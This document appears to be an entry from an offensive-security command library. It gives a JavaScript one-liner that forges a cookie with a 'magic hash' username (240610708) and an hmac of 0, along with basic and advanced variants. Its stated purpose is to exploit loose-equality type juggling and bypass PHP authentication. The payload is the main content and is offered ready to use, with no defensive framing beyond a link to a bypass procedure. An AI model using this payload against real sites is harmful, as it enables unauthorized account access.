---
id: 9b9fcc4c-82fb-429b-a058-8bcfc2691fcd
name: javascript-set-cookie
type: command
executor: javascript
data: >-
  document.cookie = "username=240610708; hmac=0; $expiration=" +
  Math.floor(Date.now() / 1000 + 3600);
output: null
created_at: '2023-04-06T03:56:40.699163+00:00'
updated_at: '2023-04-06T03:56:40.708515+00:00'
platforms:
  - Web
tags:
  - cookie-manipulation
verified: true
validated: true
---

# javascript-set-cookie

## Command

```javascript
document.cookie = "username=240610708; hmac=0; $expiration=" + Math.floor(Date.now() / 1000 + 3600);
```

## Description

This JavaScript command sets a cookie with manipulated values for username (magic input), hmac ('0' for juggling), and expiration (current time + 1 hour in seconds) to exploit PHP auth bypass.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| username=240610708 | Magic username that MD5-hashes to 0e... | Yes |
| hmac=0 | Value to trigger loose equality | Yes |
| $expiration=... | Future timestamp in seconds | Yes |

## Examples

### Basic Usage

```javascript
document.cookie = "username=240610708; hmac=0; $expiration=1720000000";
```

### Advanced Usage

```javascript
document.cookie = "username=" + magicUser + "; hmac=" + hmacVal + "; $expiration=" + (Date.now()/1000 + 3600);
```

## Expected Output

Cookie set; verify in browser dev tools.

## Related

- [[procedures/Bypass-PHP-Authentication-with-Type-Juggling-and-Magic-Hashes]]
